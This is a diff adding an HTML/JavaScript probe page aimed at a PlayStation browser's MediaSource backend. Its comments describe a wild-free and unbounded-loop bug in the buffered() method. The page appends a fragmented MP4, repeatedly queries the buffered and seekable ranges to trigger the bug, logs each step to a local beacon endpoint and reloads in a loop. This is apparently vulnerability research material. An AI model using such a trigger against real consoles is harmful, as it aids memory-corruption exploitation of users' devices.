@@ -1,0 +1,113 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8"><title>msbuf2</title></head>
+<body><video id="v" muted width="160" height="120"></video><script>
+// Wild-free / unbounded-loop probe with REAL fragmented MP4.
+// MediaSourcePrivatePlayStation::buffered() (shipped source) returns
+// std::unique_ptr<TimeRanges>(&stackLocal) and loops on length() instead of
+// index < length(). This page appends a valid fMP4 (sample_frag.mp4, remuxed
+// from sample.mp4 with empty_moov+frag_keyframe) so the backend actually asks
+// its client for ranges, then queries every media accessor step by step.
+
+function beacon(tag) {
+  try {
+    var x = new XMLHttpRequest();
+    x.open('GET', '/beacon/' + encodeURIComponent(tag) + '?t=' + Date.now(), false);
+    x.send(null);
+  } catch (e) {}
+}
+function step(name, fn) {
+  beacon('MB-BEFORE ' + name);
+  try {
+    var r = fn();
+    beacon('MB-AFTER ' + name + ' r=' + r);
+    return r;
+  } catch (e) {
+    beacon('MB-EXC ' + name + ' ' + (e && e.name));
+    return null;
+  }
+}
+function sleep(ms) { return new Promise(function(r) { setTimeout(r, ms); }); }
+function getBuffer(url) {
+  return new Promise(function(res, rej) {
+    var x = new XMLHttpRequest();
+    x.open('GET', url, true);
+    x.responseType = 'arraybuffer';
+    x.onload = function() { res(new Uint8Array(x.response)); };
+    x.onerror = rej;
+    x.send(null);
+  });
+}
+function once(el, ev, ms) {
+  return new Promise(function(res) {
+    var done = false;
+    function fin(w) { if (!done) { done = true; res(w); } }
+    el.addEventListener(ev, function() { fin(ev); }, { once: true });
+    setTimeout(function() { fin('timeout'); }, ms);
+  });
+}
+
+async function run() {
+  beacon('MB-START mediaSource=' + (typeof MediaSource));
+  var v = document.getElementById('v');
+
+  var types = ['video/mp4; codecs="avc1.42E01E"', 'video/mp4; codecs="avc1.4D401E"',
+               'video/mp4; codecs="avc1.64001E"', 'video/mp4', 'audio/mp4; codecs="mp4a.40.2"'];
+  for (var t = 0; t < types.length; t++) {
+    var ok = false;
+    try { ok = MediaSource.isTypeSupported(types[t]); } catch (e) { ok = 'exc'; }
+    beacon('MB-TYPE ' + types[t] + ' -> ' + ok);
+    if (ok === true && !v.__type) v.__type = types[t];
+  }
+  if (!v.__type) { beacon('MB-NO-TYPE'); return; }
+
+  var ms = new MediaSource();
+  v.src = URL.createObjectURL(ms);
+  await once(ms, 'sourceopen', 3000);
+  beacon('MB-OPEN ' + ms.readyState + ' type=' + v.__type);
+
+  var sb = ms.addSourceBuffer(v.__type);
+  var frag = await getBuffer('/corpus/sample_frag.mp4');
+  beacon('MB-FRAG bytes=' + frag.length);
+
+  var CH = 131072;
+  for (var off = 0; off < frag.length; off += CH) {
+    var chunk = frag.subarray(off, Math.min(off + CH, frag.length));
+    beacon('MB-APPEND off=' + off + ' n=' + chunk.length);
+    try { sb.appendBuffer(chunk); } catch (e) { beacon('MB-APPEND exc ' + (e && e.name)); break; }
+    var w = await once(sb, 'updateend', 2000);
+    if (w !== 'updateend') { beacon('MB-APPEND stall ' + w + ' off=' + off); break; }
+    if (off % (CH * 8) < CH) {
+      step('buffered-during-append', function() { return v.buffered.length; });
+    }
+  }
+  beacon('MB-APPENDED');
+
+  for (var i = 0; i < 8; i++) {
+    step('buffered-' + i, function() {
+      var n = v.buffered.length, s = -1;
+      if (n > 0) s = Math.round(v.buffered.start(0) * 1000);
+      return n + '@' + s;
+    });
+    step('seekable-' + i, function() { return v.seekable.length; });
+    await sleep(120);
+  }
+
+  step('play', function() { v.play().catch(function() {}); return 1; });
+  await sleep(300);
+  step('buffered-playing', function() { return v.buffered.length + '@' + Math.round(v.currentTime * 1000); });
+
+  step('seek', function() { v.currentTime = 1.5; return 1; });
+  var sk = await once(v, 'seeked', 1500);
+  beacon('MB-SEEKED ' + sk);
+  step('buffered-after-seek', function() { return v.buffered.length; });
+
+  try { ms.endOfStream(); beacon('MB-EOS'); } catch (e) { beacon('MB-EOS exc ' + (e && e.name)); }
+  await sleep(200);
+  step('buffered-after-eos', function() { return v.buffered.length; });
+
+  beacon('MB-DONE');
+  setTimeout(function() { location.reload(); }, 800);
+}
+
+run().catch(function(e) { beacon('MB-FATAL ' + (e && e.name)); });
+</script></body></html>
